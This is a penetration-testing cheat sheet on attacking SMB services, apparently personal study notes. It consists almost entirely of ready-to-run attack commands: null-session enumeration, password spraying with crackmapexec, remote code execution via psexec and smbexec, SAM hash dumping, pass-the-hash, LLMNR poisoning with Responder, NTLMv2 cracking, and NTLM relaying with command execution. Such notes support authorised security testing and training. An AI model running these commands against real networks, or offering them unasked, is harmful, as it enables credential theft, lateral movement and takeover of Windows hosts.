# Attacking SMB

SMB on TCP/445 (or 139 with NetBIOS). Scan both ports, `-sC` checks signing and SMB version.

---

## Enumeration

Null session check + share listing:

```bash
smbclient -N -L //<TARGET>
smbmap -H <TARGET>
```

Recursive browse + permissions per share:

```bash
smbmap -H <TARGET> -r <SHARE>
```

Download / upload through smbmap:

```bash
smbmap -H <TARGET> --download "<SHARE>\<FILE>"
smbmap -H <TARGET> --upload <LOCALFILE> "<SHARE>\<FILE>"
```

RPC null session enum:

```bash
rpcclient -U'%' <TARGET>
# then: enumdomusers
```

Full automated null enum:

```bash
./enum4linux-ng.py <TARGET> -A -C
```

---

## Password Spraying

CME spray — `--local-auth` for non-domain hosts, `--continue-on-success` to keep going after first hit:

```bash
crackmapexec smb <TARGET> -u <USERLIST> -p '<PASS>' --local-auth
```

---

## With Admin Creds — Windows Targets

RCE via psexec (drops service to ADMIN$, lands as SYSTEM):

```bash
impacket-psexec <DOMAIN>/<USER>:'<PASS>'@<TARGET>
```

RCE via CME (no binary drop):

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method smbexec
```

Who's logged on across a subnet:

```bash
crackmapexec smb <CIDR> -u <USER> -p '<PASS>' --loggedon-users
```

Dump SAM hashes:

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --sam
```

PTH — use NT hash directly, no password needed:

```bash
crackmapexec smb <TARGET> -u <USER> -H <NTHASH>
```

---

## Forced Auth — Hash Capture

Responder poisons LLMNR/NBT-NS/MDNS — captures NTLMv2 hashes:

```bash
sudo responder -I <IFACE>
```

Crack captured NTLMv2 (mode 5600):

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST>
```

Relay instead of cracking — disable SMB in `/etc/responder/Responder.conf` first (`SMB = Off`), then relay to a target that has signing disabled:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
```

Relay with command execution:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<PS_COMMAND>'
```

> [!warning] Relay only works when SMB signing is **not required** on the target. Check `signing:False` in CME/Nmap output before attempting.

> [!tip] SAM dump → NT hashes → PTH immediately. Don't wait to crack — PTH is faster and works regardless of password complexity.